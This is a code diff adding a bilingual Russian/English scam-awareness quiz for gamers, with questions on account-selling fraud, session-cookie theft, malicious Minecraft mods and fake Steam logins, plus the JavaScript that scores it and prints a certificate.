+      {
+        scenario: isRu
+          ? 'В Brawl Stars вам предлагают купить чужой прокачанный аккаунт с 50,000 кубков за небольшие деньги. Почему это почти всегда заканчивается потерей денег?'
+          : 'In Brawl Stars, someone offers to sell a maxed 50k trophy account for cheap. Why does this almost inevitably result in lost money?',
+        answers: isRu
+          ? [
+              'Потому что продавец может в любой момент восстановить аккаунт через поддержку Supercell по чекам первых покупок, а передача аккаунтов запрещена правилами.',
+              'Потому что в Brawl Stars нельзя менять привязанную почту.',
+              'Потому что цена скинов со временем падает.'
+            ]
+          : [
+              'The seller can reclaim the account anytime via Supercell support using original purchase receipts, and account trading is prohibited.',
+              'Because Brawl Stars does not allow email address updates.',
+              'Because in-game skins depreciate over time.'
+            ],
+        correct: 0,
+        expl: isRu
+          ? 'По правилам Supercell покупка и продажа аккаунтов наказывается перманентным баном. Кроме того, исходный владелец легко восстановит доступ по первичным квитанциям Google Play / App Store.'
+          : 'Account buying violates Terms of Service and guarantees account recovery fraud through original transaction receipts.'
+      },
+      {
+        scenario: isRu
+          ? 'Что из перечисленного КАТЕГОРИЧЕСКИ нельзя передавать никому, даже «администраторам» или «друзьям»?'
+          : 'Which of the following must you NEVER share with anyone under any circumstances?',
+        answers: isRu
+          ? [
+              'Свой общедоступный игровой никнейм и тег игрока.',
+              'Код из СМС, код Steam Guard, куку .ROBLOSECURITY и файл session.dat.',
+              'Ссылку на свой профиль в сообществе.'
+            ]
+          : [
+              'Your public gamertag and player ID.',
+              'SMS verification codes, Steam Guard codes, .ROBLOSECURITY cookies, or session tokens.',
+              'Your public profile link.'
+            ],
+        correct: 1,
+        expl: isRu
+          ? 'Коды 2FA и сессионные куки дают мгновенный доступ в обход любых паролей. Ни одна настоящая служба поддержки никогда их не запрашивает.'
+          : '2FA codes and session cookies grant instant authenticated access bypassing passwords.'
+      },
+      {
+        scenario: isRu
+          ? 'Вам предлагают скачать бесплатный чит или модификацию для Minecraft в виде файла «Optifine_Mod.jar» через Discord. Какая главная опасность?'
+          : 'Someone on Discord sends you a Minecraft mod file named "Optifine_Mod.jar". What is the primary danger?',
+        answers: isRu
+          ? [
+              'Игра просто вылетит с ошибкой совместимости.',
+              'Файлы .jar являются исполняемым Java-кодом. Внутри может быть встроен "раттер" (инфостилер), который украдет Discord токены, сессии браузера и криптокошельки.',
+              'Файл изменит настройки графики без вашего согласия.'
+            ]
+          : [
+              'The client will simply crash due to forge incompatibility.',
+              'JAR files contain executable bytecode capable of delivering info-stealers (ratters) harvesting browser sessions and tokens.',
+              'The file will alter graphic settings without permission.'
+            ],
+        correct: 1,
+        expl: isRu
+          ? 'Модификации в формате .jar имеют полный доступ к операционной системе. Скачивать моды можно только с проверенных порталов (CurseForge, Modrinth).'
+          : 'Minecraft mods are executable Java archives capable of deploying token stealers and session hijackers.'
+      },
+      {
+        scenario: isRu
+          ? 'Вы переходите по ссылке на «раздачу ножей» и видите окно входа через Steam. Как отличить настоящее окно входа от поддельного?'
+          : 'You visit a "knife giveaway" site with a Steam OpenID login popup. How do you distinguish authentic Steam OpenID from a phishing clone?',
+        answers: isRu
+          ? [
+              'Если вы уже залогинены на steampowered.com в браузере, настоящее окно Steam покажет ваш аватар и кнопку «Войти», не требуя вводить логин и пароль.',
+              'По цвету кнопки «Войти».',
+              'У настоящего окна всегда есть логотип Valve внизу.'
+            ]
+          : [
+              'If you are already logged into steamcommunity.com, authentic Steam OpenID will show your avatar and a single "Sign In" button without asking for credentials.',
+              'By the color shade of the button.',
+              'Authentic popups always have a Valve copyright notice.'
+            ],
+        correct: 0,
+        expl: isRu
+          ? 'Настоящий Steam OpenID использует вашу существующую сессию браузера. Если вы уже залогинены на Steam, сторонний сайт НИКОГДА не должен просить ввести логин и пароль заново.'
+          : 'Authentic OpenID relies on your existing browser session. If logged in, genuine portals only ask for confirmation, never fresh password entry.'
+      },
+      {
+        scenario: isRu
+          ? 'Что нужно сделать ПЕРВЫМ делом, если вы случайно ввели пароль на подозрительном сайте?'
+          : 'What is the FIRST action you should take if you accidentally submitted credentials on a suspicious site?',
+        answers: isRu
+          ? [
+              'Написать в чат мошеннику с требованием вернуть данные.',
+              'Немедленно зайти на официальный сайт, сменить пароль, завершить все активные сессии и сбросить Steam API-ключи.',
+              'Удалить браузер и перезагрузить компьютер.'
+            ]
+          : [
+              'Message the scammer demanding they delete the data.',
+              'Immediately visit the official site, change your password, deauthorize all other devices, and revoke Steam API keys.',
+              'Uninstall the browser and reboot the PC.'
+            ],
+        correct: 1,
+        expl: isRu
+          ? 'Счет идет на минуты. Быстрая смена пароля и сброс сессий/API-токенов аннулирует украденные мошенником данные.'
+          : 'Speed is critical. Changing passwords and deauthorizing active sessions revokes stolen access tokens immediately.'
+      }
+    ];
+
+    let currentQIdx = 0;
+    let score = 0;
+    const qBadge = document.getElementById('question-badge');
+    const qText = document.getElementById('question-text');
+    const answersBox = document.getElementById('answers-container');
+    const explBox = document.getElementById('explanation-box');
+    const explTitle = document.getElementById('expl-title');
+    const explText = document.getElementById('expl-text');
+    const explIcon = document.getElementById('expl-icon');
+    const nextBtn = document.getElementById('btn-next-question');
+    const progText = document.getElementById('test-progress-text');
+    const progBar = document.getElementById('test-progress-bar');
+    const qActiveView = document.getElementById('test-active-question');
+    const resultsView = document.getElementById('test-results-view');
+    const finalScore = document.getElementById('final-score-display');
+    const finalRank = document.getElementById('final-rank-badge');
+    const certDate = document.getElementById('cert-date');
+    const certId = document.getElementById('cert-id');
+
+    function renderQuestion(idx) {
+      explBox.classList.add('hidden');
+      const q = examQuestions[idx];
+      progText.textContent = isRu ? `Вопрос ${idx + 1} из ${examQuestions.length}` : `Question ${idx + 1} of ${examQuestions.length}`;
+      progBar.style.width = `${((idx + 1) / examQuestions.length) * 100}%`;
+      qBadge.textContent = isRu ? `Сценарий ${idx + 1}` : `Scenario ${idx + 1}`;
+      qText.textContent = q.scenario;
+
+      answersBox.innerHTML = '';
+      q.answers.forEach((ans, aIdx) => {
+        const btn = document.createElement('button');
+        btn.type = 'button';
+        btn.className = 'w-full text-left p-4 rounded-2xl border border-slate-200 dark:border-navy-700 bg-white dark:bg-navy-900 text-slate-800 dark:text-cloud hover:border-cyan hover:bg-slate-50 dark:hover:bg-navy-800 transition-all font-medium text-xs sm:text-sm flex items-center justify-between group';
+        btn.innerHTML = `
+          <span>${ans}</span>
+          <span class="w-6 h-6 rounded-full border border-slate-300 dark:border-navy-700 flex items-center justify-center text-xs text-slate-400 group-hover:border-cyan group-hover:text-cyan">
+            ${String.fromCharCode(65 + aIdx)}
+          </span>
+        `;
+        btn.onclick = () => selectAnswer(aIdx);
+        answersBox.appendChild(btn);
+      });
+    }
+
+    function selectAnswer(chosenIdx) {
+      const q = examQuestions[currentQIdx];
+      const isCorrect = chosenIdx === q.correct;
+      if (isCorrect) score++;
+
+      // Disable all buttons and show colors
+      const buttons = answersBox.querySelectorAll('button');
+      buttons.forEach((btn, bIdx) => {
+        btn.disabled = true;
+        if (bIdx === q.correct) {
+          btn.className = 'w-full text-left p-4 rounded-2xl border border-emerald-500 bg-emerald-500/10 text-emerald-800 dark:text-emerald-300 font-medium text-xs sm:text-sm flex items-center justify-between';
+        } else if (bIdx === chosenIdx) {
+          btn.className = 'w-full text-left p-4 rounded-2xl border border-red-500 bg-red-500/10 text-red-800 dark:text-red-300 font-medium text-xs sm:text-sm flex items-center justify-between';
+        }
+      });
+
+      // Show explanation
+      explBox.classList.remove('hidden');
+      if (isCorrect) {
+        explBox.className = 'p-5 rounded-2xl border border-emerald-500/40 bg-emerald-500/10 text-emerald-900 dark:text-emerald-200';
+        explIcon.textContent = '✓';
+        explTitle.textContent = isRu ? 'Правильно!' : 'Correct!';
+      } else {
+        explBox.className = 'p-5 rounded-2xl border border-red-500/40 bg-red-500/10 text-red-900 dark:text-red-200';
+        explIcon.textContent = '✗';
+        explTitle.textContent = isRu ? 'Неверно' : 'Incorrect';
+      }
+      explText.textContent = q.expl;
+    }
+
+    nextBtn.onclick = () => {
+      currentQIdx++;
+      if (currentQIdx < examQuestions.length) {
+        renderQuestion(currentQIdx);
+      } else {
+        showFinalResults();
+      }
+    };
+
+    function showFinalResults() {
+      qActiveView.classList.add('hidden');
+      resultsView.classList.remove('hidden');
+
+      const total = examQuestions.length;
+      const pct = Math.round((score / total) * 100);
+      finalScore.textContent = `${score} / ${total} (${pct}%)`;
+
+      if (pct >= 85) {
+        finalRank.textContent = '🛡️ Cyber Defense Master (Высшая защита)';
+      } else if (pct >= 60) {
+        finalRank.textContent = '⚠️ Cautious Gamer (Базовая защита)';
+      } else {
+        finalRank.textContent = '🚨 High Risk (Рекомендуется повторить базу)';
+      }
+
+      certDate.textContent = new Date().toISOString().split('T')[0];
+      certId.textContent = `SIG-2026-${Math.floor(1000 + Math.random() * 9000)}`;
+    }
+
+    // Retake exam
+    document.getElementById('btn-restart-exam').onclick = () => {
+      score = 0;
+      currentQIdx = 0;
+      resultsView.classList.add('hidden');
+      qActiveView.classList.remove('hidden');
+      renderQuestion(0);
+    };
+
+    // Print certificate
+    document.getElementById('btn-print-cert').onclick = () => {
+      window.print();
+    };
+
+    renderQuestion(0);
+  }
+
+  initScamLab();
+  document.addEventListener('astro:page-load', initScamLab);
+</script>
